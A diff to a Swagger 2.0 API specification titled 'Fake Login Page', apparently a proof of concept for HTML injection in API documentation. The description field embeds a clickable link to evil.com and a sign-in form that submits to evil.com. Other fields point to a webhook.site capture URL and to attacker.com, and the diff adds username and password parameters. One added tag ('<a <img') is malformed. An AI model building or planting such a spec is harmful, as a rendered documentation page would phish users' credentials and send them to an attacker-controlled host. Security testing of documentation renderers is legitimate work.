@@ -1,11 +1,10 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
+  title: "Login Page - Fake Login Page"
   description: |
-    <a href="https://www.evil.com">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg" alt="Clickable Image" width="120">
-    </a>
+    <a href="https://www.evil.com">Click Me</a>
+    <a <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg" alt="Clickable Image" width="120"> </a>
     <div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
@@ -21,8 +20,7 @@ info:
         </div>
       </form>
     </div>
-  termsOfService: |
-    https://webhook.site/ac5a1a22-d382-4277-917e-257cf18c8428
+  termsOfService: "https://webhook.site/ac5a1a22-d382-4277-917e-257cf18c8428"
   contact:
     name: "API Support"
     url: "https://attacker.com/"
@@ -30,7 +28,25 @@ info:
 paths:
   /:
     post:
+      summary: "Submit login form"
+      description: "Endpoint representing the login form POST."
+      consumes:
+        - application/x-www-form-urlencoded
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
       responses:
         '200':
           description: Login successful
-
+        '400':
+          description: Invalid credentials or missing parameters
+        '500':
+          description: Internal server error
